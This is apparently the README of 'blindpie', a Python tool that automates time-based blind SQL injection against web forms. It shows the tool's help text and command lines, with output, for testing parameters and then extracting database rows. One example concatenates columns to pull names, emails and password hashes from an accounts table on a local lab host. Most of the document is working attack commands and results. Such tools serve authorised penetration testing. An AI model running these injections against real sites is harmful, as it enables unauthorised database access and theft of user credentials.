# blindpie

`blindpie` is a simple Python script to automate time-based blind SQL injections.<br>

It can be used when the target doesn't print any error or any feedback whatsoever.

It should work fine injecting in SELECT, DELETE, and UPDATE queries. Injections in INSERT queries are supported only for parameters which are unquoted (numeric values).

![Demo](/demo/demo.gif)

## Usage

Use the `--help` command to show the help message:

```
  _     _ _           _       _
 | |   | (_)         | |     (_)
 | |__ | |_ _ __   __| |_ __  _  ___
 | '_ \| | | '_ \ / _` | '_ \| |/ _ \
 | |_) | | | | | | (_| | |_) | |  __/
 |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
                       | |
                       |_|

usage: blindpie.py [-h] -u URL -p PARAMS [PARAMS ...] -d DEFAULT [DEFAULT ...]
                   (--post | --get) [-M M] [-T T]
                   {test,attack} ...

A simple tool to automate time-based blind SQL injections.

positional arguments:
  {test,attack}

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     url of the target
  -p PARAMS [PARAMS ...], --params PARAMS [PARAMS ...]
                        parameters for the requests
  -d DEFAULT [DEFAULT ...], --default DEFAULT [DEFAULT ...]
                        default values for the parameters
  --post                use method POST
  --get                 use method GET
  -M M                  attack mode (from 0, the least reliable but the
                        fastest, to 4, the most reliable but the slowest)
  -T T                  number of threads to create when getting multiple rows

Note: the default values must be of the same type of data of the parameters
(use numbers for the parameters which are numbers, strings otherwise).
```

The script provides two modes of operation: the <i>test mode</i> and the <i>attack mode</i>.

### Test mode

The <i>test mode</i> is used to test which parameters of the GET/POST request could be vulnerable to SQL injection.

This is the help message for the <i>test mode</i>:

```
usage: blindpie.py test [-h] --test

optional arguments:
  -h, --help  show this help message and exit
  --test      test for vulnerabilities
```

Use the `--test` flag to test the parameters.

#### Example:

The page with url `192.168.0.104/sqli/time_based_blind_escaped.php` accepts POST requests with parameters `to` and `msg`, where the former is an integer and the latter is a string. The `-d` parameter is used to set the default value for the parameter of the request and to distinguish between numeric values (which in queries are unquoted) and strings (in queries are quoted). Use as default values strings if the parameter is a string, numeric values if the parameter is an integer, float, etc...

```
$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post test --test
  _     _ _           _       _      
 | |   | (_)         | |     (_)     
 | |__ | |_ _ __   __| |_ __  _  ___
 | '_ \| | | '_ \ / _` | '_ \| |/ _ \
 | |_) | | | | | | (_| | |_) | |  __/
 |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
                       | |           
                       |_|           

[*] avg response time is 0.019 sec (done in 0.049 sec)
[*] testing params: |████████████████████████████████████████| 100.0% complete
> RESULTS:
[*] to seems to be vulnerable
[*] msg doesn't seem to be vulnerable
[*] all done in 0.063 sec
```

The script tests each parameter of the request and shows if it seems to be vulnerable or not.

### Attack mode

The <i>attack mode</i> is used to extract data from the database by exploiting vulnerable parameters.

This is the help message for the <i>attack mode</i>:

```
usage: blindpie.py attack [-h] --param PARAM --table TABLE --column COLUMN
                          --row ROW [--rows ROWS] [--max_length MAX_LENGTH]
                          [--min_length MIN_LENGTH]

optional arguments:
  -h, --help            show this help message and exit
  --param PARAM         vulnerable parameter to exploit
  --table TABLE         name of the table from which to select
  --column COLUMN       name of the column to select
  --row ROW             index of the row to select
  --rows ROWS           number of rows to select
  --max_length MAX_LENGTH
                        max length of a selected row
  --min_length MIN_LENGTH
                        min length of a selected row
```

#### Example:

The page with url `192.168.0.104/sqli/time_based_blind.php` accepts GET requests with a parameter named `email`, which is a string. The `-d` parameter is used to set the default value for the parameter. As said before, use as default values strings if the parameter is a string, numeric values if the parameter is an integer, float, etc...

In this case I'm going to extract the rows from 0 to 3 of the `first_name` column from the table `accounts` by exploiting the `email` parameter of the GET request:

```
$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T4 attack --table accounts --column first_name --param email --row 0 --rows 4
  _     _ _           _       _      
 | |   | (_)         | |     (_)     
 | |__ | |_ _ __   __| |_ __  _  ___
 | '_ \| | | '_ \ / _` | '_ \| |/ _ \
 | |_) | | | | | | (_| | |_) | |  __/
 |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
                       | |           
                       |_|           

[*] avg response time is 0.031 sec (done in 0.096 sec)
[*] row 0 length is 6
[*] row 1 length is 4
[*] row 2 length is 6
[*] row 3 length is 6
[*] getting 4 rows: |████████████████████████████████████████| 100.0% complete (34.583 sec)
> RESULTS:
Arthur
Ford
Tricia
Zaphod
[*] all done in 34.583 sec
```

Note #1: use the `-M` parameter to set the reliability of the script. The value goes from 0 (the least reliable but the fastest) to 4 (the most reliable but the slowest).

Note #2: use the `-T` parameter to set the number of rows to extract concurrently. <strong>Multithreading is suggested during local analysis only. It seems to be less reliable for non local targets.</strong>

The script will test each character of each row and will print the rows found.

### Trick

You can extract multiple columns at once by concatenating the values. Use the `concat` function when specifying the column name:

```
$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T10 attack --table accounts --column "concat(id, char(32), first_name, char(32), last_name, char(32), email, char(32), password)" --param email --row 0 --rows 10
  _     _ _           _       _
 | |   | (_)         | |     (_)
 | |__ | |_ _ __   __| |_ __  _  ___
 | '_ \| | | '_ \ / _` | '_ \| |/ _ \
 | |_) | | | | | | (_| | |_) | |  __/
 |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
                       | |
                       |_|

[*] avg response time is 0.018 sec (done in 0.054 sec)
[*] row 0 length is 71
[*] row 1 length is 70
[*] row 2 length is 75
[*] row 3 length is 77
[*] row 4 seems to be empty
[*] row 5 seems to be empty
[*] row 6 seems to be empty
[*] row 7 seems to be empty
[*] row 8 seems to be empty
[*] row 9 seems to be empty
[*] getting 10 rows: |████████████████████████████████████████| 100.0% complete (373.877 sec)
> RESULTS:
1 Arthur Dent arthur@guide.com d00ee262cdcbe7543210bb85f6f1cac257b4e994
2 Ford Prefect ford@guide.com 30f5cc99c17426a0d28acf8905c6d776039ad022
3 Tricia McMillan tricia@guide.com bcb3358e273b5772ee0ae1799b612e13cc726b04
4 Zaphod Beeblebrox zaphod@guide.com 0c38530eaca4dbc0f49c459c0c52b362f14215c3
[empty]
[empty]
[empty]
[empty]
[empty]
[empty]
[*] all done in 373.877 sec
```

Note #1: a row can't be longer than `MAX_ROW_LENGTH` (by default is 128) or it will be ignored and considered empty.

Note #2: `char(32)` is the 'space' character.

## Authors

* **Alessio Vierti** - *Initial work*

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
